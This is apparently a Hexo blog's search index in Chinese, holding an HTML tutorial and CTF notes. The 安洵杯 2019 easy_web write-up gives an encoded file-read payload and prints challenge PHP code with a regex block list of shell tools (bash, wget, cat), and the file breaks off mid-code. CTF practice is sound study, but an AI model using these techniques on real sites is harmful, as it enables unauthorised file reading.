<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>js基础</title>
      <link href="/2024/01/21/js%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/01/21/js%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础</title>
      <link href="/2024/01/21/HTML%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/01/21/HTML%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>众所周知HTML是一款超文本标记语言而不是编程语言</p><p>摘自菜鸟教程:</p><blockquote><p>超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><p>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。</p></blockquote><h2 id="一些过去没注意到的点"><a href="#一些过去没注意到的点" class="headerlink" title="一些过去没注意到的点:"></a>一些过去没注意到的点:</h2><p>HTML的文件后缀名有两种:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.html</span><br><span class="line">.htm</span><br></pre></td></tr></table></figure><p>这两种都是表示html文件,完全一样</p><p>html标签是不区分大小写的,所以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;TiTLE&gt;&lt;/title&gt;</span><br><span class="line">&lt;TITLE&gt;&lt;/TITLE&gt;</span><br></pre></td></tr></table></figure><p>这些都是等价的</p><p>但通常都写作小写字母</p><p>(这些特性或许有一定的利用价值)</p><h3 id="为什么需要html"><a href="#为什么需要html" class="headerlink" title="为什么需要html?"></a>为什么需要html?</h3><p>以本人浅薄的认知,html的存在正如其名用于标记文本,将不同的文本内容标记上特定标签(tag),用于对每一类型的文本实现不同的显示效果或者对他们进行不同的操作.</p><p>当然这只是便于我个人理解,最终的解释还是得看官方文档</p><p>MDN上的教程: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML">HTML（超文本标记语言）</a></p><h2 id="标签-元素-属性"><a href="#标签-元素-属性" class="headerlink" title="标签,元素,属性"></a>标签,元素,属性</h2><p>在HTML中,标签 元素 属性通常是关联出现的,一对标签内包含着对应的元素,不同的元素可以有不同的属性</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>&lt;p&gt;&lt;/p&gt;</code> <code>&lt;a&gt;&lt;/a&gt;</code>为标签,其中包裹的文字内容为元素,而<code>href</code>则为属性,其指定了一个链接</p><p>当然,单独的这些标签并不能起到我们想要的作用,还需要加上一些特定的html说明</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就构成了完整的一个html文件,开启apache或其他网络服务,我们就可以访问到这个网页的内容</p><p>将它的文件名改为<code>index.html</code>作为网站的起始</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240121125705980.png" alt="image-20240121125705980"></p><h2 id="接下来是一些常用的标签"><a href="#接下来是一些常用的标签" class="headerlink" title="接下来是一些常用的标签"></a>接下来是一些常用的标签</h2><blockquote><p><code>&lt;h1&gt;&lt;/h1&gt;</code>~&#96;<h6></h6>&#96; :分别对应1到6级标题</p><p><code>&lt;p&gt;&lt;/p&gt;</code> : 文字段落标签</p><p><code>&lt;a href=xxxx &gt;&lt;/a&gt;</code> : 超链接标签</p><p><code>&lt;hr&gt;</code>: 水平分割线</p><p><code>&lt;br&gt;</code>: 空白行 </p></blockquote><h3 id="HTML标题"><a href="#HTML标题" class="headerlink" title="HTML标题"></a>HTML标题</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;form.js&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><form action = "form.js" method="post">        <div>            <label>username</label>            <input type="text" name="username" placeholder="Enter your username">        </div>        <div>            <label>password</label>            <input type="password" name="password" placeholder="Enter your password">        </div>        <input type="submit" name="submit" value="submit">    </form><h3 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h3><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>&lt;ol&gt;</code></td><td align="left">定义有序列表</td></tr><tr><td align="left"><code>&lt;ul&gt;</code></td><td align="left">定义无序列表</td></tr><tr><td align="left"><code>&lt;li&gt;</code></td><td align="left">定义列表项</td></tr><tr><td align="left"><code>&lt;dl&gt;</code></td><td align="left">定义列表</td></tr><tr><td align="left"><code>&lt;dt&gt;</code></td><td align="left">自定义列表项目</td></tr><tr><td align="left"><code>&lt;dd&gt;</code></td><td align="left">定义自定列表项的描述</td></tr></tbody></table><h5 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表:"></a>无序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆浆<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>油条<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆汁<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>焦圈<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ul>    <li>豆浆</li>    <li>油条</li>    <li>豆汁</li>    <li>焦圈</li></ul><h5 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表:"></a>有序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>沿这条路走到头<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>右转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>直行穿过第一个十字路口<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>在第三个十字路口处左转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>继续走 300 米，学校就在你的右手边<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ol>  <li>沿这条路走到头</li>  <li>右转</li>  <li>直行穿过第一个十字路口</li>  <li>在第三个十字路口处左转</li>  <li>继续走 300 米，学校就在你的右手边</li></ol>### HTML表格table<p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="comment">&lt;!--这是表格的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="comment">&lt;!--表头--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="comment">&lt;!--table head--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>外语<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="comment">&lt;!--table body--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--同样是table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--table data--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span>  </span><br></pre></td></tr></table></figure><table>    <head>        <tr>            <th>语文</th>            <th>数学</th>            <th>外语</th>        </tr>    </head>    <body>        <tr>            <td>100</td>            <td>100</td>            <td>100</td>        </tr>    </body> </table><h3 id="HTML表单form"><a href="#HTML表单form" class="headerlink" title="HTML表单form"></a>HTML表单form</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;form.js&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="强调与加粗"><a href="#强调与加粗" class="headerlink" title="&lt;em&gt;&lt;/em&gt;强调与&lt;strong&gt;&lt;/strong&gt;加粗"></a><code>&lt;em&gt;&lt;/em&gt;</code>强调与<code>&lt;strong&gt;&lt;/strong&gt;</code>加粗</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  这杯液体<span class="tag">&lt;<span class="name">strong</span>&gt;</span>毒性很大<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>——如果饮用了它，你<span class="tag">&lt;<span class="name">strong</span></span></span><br><span class="line"><span class="tag">    &gt;</span>可能<span class="tag">&lt;<span class="name">em</span>&gt;</span>会死<span class="tag">&lt;/<span class="name">em</span>&gt;</span>&lt;/strong</span><br><span class="line">  &gt;。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><p>  这杯液体<strong>毒性很大</strong>——如果饮用了它，你<strong    >可能<em>会死</em></strong  >。</p><h3 id="在html中嵌入多媒体"><a href="#在html中嵌入多媒体" class="headerlink" title="在html中嵌入多媒体"></a>在html中嵌入多媒体</h3><h4 id="图片"><a href="#图片" class="headerlink" title="图片:"></a>图片:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/example.jpg&quot;</span> /&gt;</span></span><br><span class="line">可选图片描述或尺寸:</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">alt</span>=<span class="string">&quot;this is a picture!&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">with</span>=<span class="string">&quot;123&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">&quot;456&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="音频与视频"><a href="#音频与视频" class="headerlink" title="音频与视频:"></a>音频与视频:</h3><p>直接嵌入一段视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据用户所能支持的格式播放对应的视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;example.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注:</p><ol><li><code>&lt;p&gt;</code>标签中的内容只有在视频无法显示时才会出现</li><li>controls 使得用户可以操控视频 例如拖动进度条等</li></ol><p>对于音频,只需要把<code>&lt;video&gt;&lt;/video&gt;</code>标签改为<code>&lt;audio&gt;&lt;/audio&gt;</code>并嵌入音频路径即可</p><h3 id="块级元素与内联元素"><a href="#块级元素与内联元素" class="headerlink" title="块级元素&lt;div&gt;与内联元素&lt;span&gt;"></a>块级元素<code>&lt;div&gt;</code>与内联元素<code>&lt;span&gt;</code></h3><p>简单理解块级与内联:</p><p>块级元素会独占一行   如: <code>&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</code></p><p>内联元素不会独占一行 如: <code> &lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</code></p><p><code>&lt;div&gt;与&lt;span&gt;</code>并没有实际意义,而是与css一同使用时为整体或部分文本设置样式与属性</p><h2 id="HTML脚本"><a href="#HTML脚本" class="headerlink" title="HTML脚本"></a>HTML脚本</h2><p>内联嵌入<code>javascript</code>客户端脚本:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Hello World!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span>抱歉，你的浏览器不支持 JavaScript!<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过src引入:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯 2019 高明的黑客</title>
      <link href="/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
      <url>/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>按照提示下载了备份文件,里面存了一大堆php木马</p><p>但是仔细观察发现大部分都要么不能运行,要么没什么实际功能</p><p>看了wp,发现此题是考验python脚本编写能力,即检索出能够利用的php文件</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_web</title>
      <link href="/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/"/>
      <url>/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure><p>这个位置很容易想到任意文件读取,不过文件名应该经过了某种编码或加密</p><p>经过尝试,<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>两次base64一次字符串转16进制得到<code>555.png</code></p><p>构造payload读取<code>index.php</code>源码</p><p>payload:</p><p>&#x2F;index.php?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</p><p>将得到的回包中的base64码解码得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span 